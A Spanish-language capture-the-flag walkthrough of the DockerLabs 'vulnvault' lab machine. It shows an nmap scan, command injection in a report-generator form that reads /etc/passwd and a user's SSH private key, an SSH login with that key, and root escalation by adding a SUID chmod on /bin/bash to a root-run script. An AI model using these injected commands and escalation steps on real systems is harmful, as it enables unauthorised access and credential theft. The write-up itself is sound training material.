# vulnvault

Maquina `vulnvault` de [DockerLabs](https://dockerlabs.es)

Autor: [d1se0](https://github.com/D1se0)

Dificultad: Fácil

![docker](./images/vulnvault/imagenes/docker.png)

## RECONOCIMIENTO

Comenzamos haciendo un escaneo de nmap:

```css
nmap -p- 172.17.0.2 -n --open --min-rate 5000 -Pn -sSVC -A -oN escaneo.txt
```

```ruby
# Nmap 7.94SVN scan initiated Sun Aug 25 18:16:59 2024 as: nmap -p- -n --open --min-rate 5000 -Pn -sSVC -A -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.000083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Generador de Reportes - Centro de Operaciones
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.08 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 25 18:17:10 2024 -- 1 IP address (1 host up) scanned in 10.59 seconds

```

Lo único que se puede ver es que esta el puerto 80 de `apache` y 22 de `openssh`, pero como no hay nada interesante continuaremos con el navegador:

#### PUERTO 80:

![80](./images/vulnvault/imagenes/80.png)

Como vemos parece ser una página de reportes, también podemos subir archivos, pero nada de eso nos sirve ya que luego de probar un rato descubrí esto:

![comando](./images/vulnvault/imagenes/comando.png)

![output](./images/vulnvault/imagenes/output.png)

Como vemos, podemos ejecutar comandos de manera remota, por lo que ahora leeremos el archivo `/etc/passwd` para ver que usuarios existen en la máquina, para hacerlo simplemente ejecutamos:

```css
;cat /etc/passwd
```

```css
Reporte: reporte_1724620988.txt

Archivo de reporte: /var/www/html/reportes/reporte_1724620988.txt
Nombre: \
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
samara:x:1001:1001:samara,,,:/home/samara:/bin/bash
```

Como podemos ver hay un usuario `samara`, sabiendo esto podriamos intentar leer la clave privada de ssh del usuario `samara` de la siguiente manera:

```css
;cat /home/samara/.ssh/id_rsa
```

```css
Reporte: reporte_1724621080.txt

Archivo de reporte: /var/www/html/reportes/reporte_1724621080.txt
Nombre: \
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9HEXYsEOUt5PUH/2fHI/buNxluV3x2qL6wATg0scjIeog9LSmW3k
K3NLw5yDON2vEfZxRSuEkUd743i2AZq/gekNEpvuUTnruRTibz/hZojm8CBpjgXccJW63a
ksBBS/G8iqTa4i9l9GFF0ytuGJ5CmAQy37dgNfsP015OrlN8jg56rtbUyR9kfscYU8R/B0
GDUo60Ek9kzv6QXzkVf/lmnKlVO/4ioJ5iEyL1z91NxBHsOWNQBCjry3kOYDynRD5mKj/g
2OZ/TWpTh/QylyKFfDQYPrbjXXWEe8nnzmoDolKtWvez0Sjig7TBV0z2swcvIuWoxwNFVL
0j/FnwkwYihlbLWi9Gu6ZeddY2+5RfZPRSZrd0+yOvUqHtZHBMBM5nMVyHoh78QyW8bA/q
K93VoLNrf8o19YyZoeNqVP03PE/sSE953JahsHr2iPyNb3q/Hgm+1mn5zL8e++oThK/s43
GeaCpew8JbRf1mD6lkfNZEhAQ2TXvtKRwvWmLxSYmExqgzXD7/XP/ZLUKNO+hQByu+l+VG
......................................................................
-----END OPENSSH PRIVATE KEY-----
```

## INTRUSION

Ahora simplemente lo copiamos y lo metemos en un archivo llamado `id_rsa` en nuestra maquina local. Luego le damos permisos de ejecución con `chmod 600 id_rsa` y nos conectamos mediante ssh de la siguiente manera:

```css
ssh -i id_rsa samara@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

#### SAMARA

Siendo el usuario samara vemos un mensaje de root que no contiene nada interesante, luego de buscar un rato se me ocurre usar `pspy` para ver si hay algún proceso oculto, para eso simplemente hacemos un wget desde la maquina victima a [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64), le damos permiso con `chmod +x pspy64` y lo ejecutamos con `./pspy64`.

```css

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/08/25 23:31:32 CMD: UID=0     PID=626428 | /bin/bash /usr/local/bin/echo.sh 
2024/08/25 23:31:32 CMD: UID=1001  PID=625471 | ./pspy64 
2024/08/25 23:31:32 CMD: UID=1001  PID=463266 | -bash 
2024/08/25 23:31:32 CMD: UID=1001  PID=463232 | sshd: samara@pts/0 
2024/08/25 23:31:32 CMD: UID=0     PID=462917 | sshd: samara [priv] 
2024/08/25 23:31:32 CMD: UID=33    PID=134146 | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=33    PID=42     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=33    PID=41     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=33    PID=40     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=33    PID=39     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=33    PID=38     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=0     PID=33     | /usr/sbin/apache2 -k start 
2024/08/25 23:31:32 CMD: UID=0     PID=15     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2024/08/25 23:31:32 CMD: UID=0     PID=1      | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
2024/08/25 23:31:32 CMD: UID=0     PID=626434 | /bin/bash /usr/local/bin/echo.sh
```

Como vemos hay un script que se ejecuta con bash:

```css
2024/08/25 23:31:32 CMD: UID=0     PID=626434 | /bin/bash /usr/local/bin/echo.sh
```

Ahora simplemente lo editamos con nano y agregamos la siguiente linea al final:

```css
chmod u+s /bin/bash
```

lo guardamos con `ctrl+o` presionamos enter y `ctrl+x` y listo, ahora simplemente ejecutamos `bash -p` y listo, _ya somos root_.

![root](./images/vulnvault/imagenes/root.png)

Gracias por leer, chau.
